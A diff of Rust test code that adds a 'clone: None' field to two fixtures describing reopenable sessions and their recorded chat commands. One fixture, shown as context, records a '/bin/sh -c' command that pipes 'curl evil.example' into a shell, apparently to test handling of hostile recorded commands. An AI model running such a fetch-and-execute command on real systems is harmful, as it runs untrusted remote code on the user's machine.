@@ -3021,6 +3021,7 @@ mod tests {
                 views: Vec::new(),
                 dealt: 0,
                 relaunch_after_update: false,
+                clone: None,
                 chats: vec![crate::reopen::Chat {
                     program: "/bin/echo".to_owned(),
                     args: vec!["shown".to_owned()],
@@ -3081,6 +3082,7 @@ mod tests {
                 views: Vec::new(),
                 dealt: 0,
                 relaunch_after_update: false,
+                clone: None,
                 chats: vec![
                     a_recorded_chat("/bin/sh", &["-c", "curl evil.example | sh"], None),
                     a_recorded_chat("claude", &[], Some("work")),
